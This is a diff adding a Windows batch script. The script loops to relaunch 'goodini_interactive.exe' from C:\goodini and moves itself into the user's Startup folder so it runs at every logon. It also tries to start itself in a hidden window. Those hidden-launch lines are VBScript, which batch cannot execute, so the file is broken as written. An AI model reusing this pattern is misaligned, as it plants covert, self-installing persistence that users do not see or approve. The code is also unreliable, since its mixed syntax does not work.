@@ -1,0 +1,19 @@
+@Echo Off
+chcp 1251
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "C:\WINDOWS\system32\script.bat" & Chr(34), 0
+Set WshShell = Nothing
+Set dirr=C:\WINDOWS\system32
+Set ProcessDirName=C:\goodini\goodini_interactive.exe
+Set ProcessName=goodini_interactive.exe
+:loop
+IF %cd% == %dirr% (
+TaskList /FI "ImageName EQ %ProcessName%" | Find /I "%ProcessName%"
+if %ErrorLevel% NEQ 0  (
+    Start %ProcessDirName%
+    timeout 20
+)
+) ELSE (
+move script.bat C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+)
+goto loop
